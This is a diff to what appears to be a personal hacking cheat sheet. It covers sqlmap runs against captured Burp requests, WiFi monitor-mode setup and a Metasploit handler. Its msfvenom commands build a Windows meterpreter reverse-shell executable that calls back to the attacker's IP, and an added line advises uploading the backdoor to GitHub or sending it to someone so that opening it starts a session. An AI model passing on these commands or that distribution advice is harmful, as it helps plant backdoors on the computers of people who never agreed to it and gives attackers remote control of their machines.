@@ -35,7 +35,7 @@ sqlmap -r login.req --batch --force-ssl
 	-'search.req = info from search bar results using BurpSuite Repeater using 'Copy to File'
 	-'login.req = info from login screen using results from BurpSuite Repeater using 'Copy to File'
 ===========================================================================================================================	
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.239 -f exe -o payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.141 -f exe -o payload.exe
 ===========================================================================================================================	
 How to set a WiFi adapter in Monitor Mode:
 ifconfig wlan0 down
@@ -65,13 +65,14 @@ msf exploit(handler) > exploit
 [*] Starting the payload handler…
 ===========================================================================================================================
 Creating an executable backdoor with Metasploit:
-# msfpayload windows/meterpreter/reverse_tcp lhost=<Listening_IP> lport=<Listening_Port> x > backdoor.exe
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.239 -f exe -o payload.exe
 
 LHOST= Your IP
 RHOST= Target IP
 
 The backdoor.exe file is saved in the path where you executed the command.
+
+Upload this file to GitHub or send it to someone, once they open it, your meterpreter session will start
 ===========================================================================================================================
 
 Wireshark Filters:
